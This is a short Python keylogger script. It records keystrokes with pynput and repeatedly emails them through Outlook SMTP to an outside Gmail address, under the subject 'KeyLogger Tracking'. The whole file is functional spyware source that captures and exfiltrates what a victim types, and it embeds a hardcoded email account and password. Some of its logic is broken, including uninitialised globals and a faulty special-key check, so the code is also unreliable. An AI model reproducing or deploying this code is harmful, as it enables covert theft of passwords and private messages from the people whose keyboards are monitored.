import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
user = "testsmtplib.123@outlook.com"
passwd = "Hellomaycung@312@@123#*"
from_addr = "testsmtplib.123@outlook.com"
to_addr = "buitien747@gmail.com"
smtp_srv = "smtp.live.com"
def send_mail(message):
    # create a mail
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "KeyLogger Tracking"

    # attach body with message
    msg.attach(MIMEText(message, 'plain'))

    # connect to the server and send the email
    with smtplib.SMTP('smtp-mail.outlook.com', 587) as connection:
        connection.starttls() 
        connection.login(user=user, password=passwd)
        connection.sendmail(from_addr=from_addr, to_addrs=to_addr, msg=msg.as_string())

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_mail(message=message)

def on_press(key):
    # 'A' pressed
    print(key, end=" ")
    print("pressed")

    global keys, count

    keys.append(str(key))
    count += 1

    if count > 10:
        count = 9
        email(keys)

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()